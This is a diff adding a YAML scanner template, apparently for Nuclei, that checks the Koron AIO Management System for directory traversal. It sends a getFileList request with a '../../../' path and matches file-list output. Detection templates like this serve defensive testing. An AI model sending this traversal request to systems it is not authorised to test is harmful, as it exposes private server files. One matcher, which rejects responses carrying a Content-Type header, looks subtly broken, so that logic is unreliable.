@@ -1,0 +1,26 @@
+id: koron-aio-getfilelist-directory-traversal
+info:
+  name: Koron AIO Management System getFileList Directory Traversal
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: directory-traversal
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ReportServlet?operation=getFileList&path=../../../"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<fileList>"
+          - "item fileName="
+          - "xml"
+      - type: word
+        part: header
+        words:
+          - "Content-Type:"
+        negative: true
